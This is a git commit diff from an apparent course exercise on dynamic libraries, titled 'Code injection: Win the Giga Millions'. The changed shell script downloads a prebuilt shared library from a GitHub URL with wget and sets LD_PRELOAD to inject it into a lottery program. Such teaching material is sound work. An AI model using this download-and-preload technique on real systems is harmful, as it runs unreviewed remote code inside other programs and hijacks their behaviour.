5a4fee332c59da29fa655f127af3c932118ad139
Franklin Obasi <franklinobasy@gmail.com>
2022-07-12 23:43:38 +0100

    3. Code injection: Win the Giga Millions

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P $PWD/hackpass.so https://raw.github.com/franklinobasy/alx-low_level_programming/main/0x18-dynamic_libraries/hackpass.so
+wget -O $PWD/hackpass.so https://raw.github.com/franklinobasy/alx-low_level_programming/main/0x18-dynamic_libraries/hackpass.so
 export LD_PRELOAD="$PWD/hackpass.so"
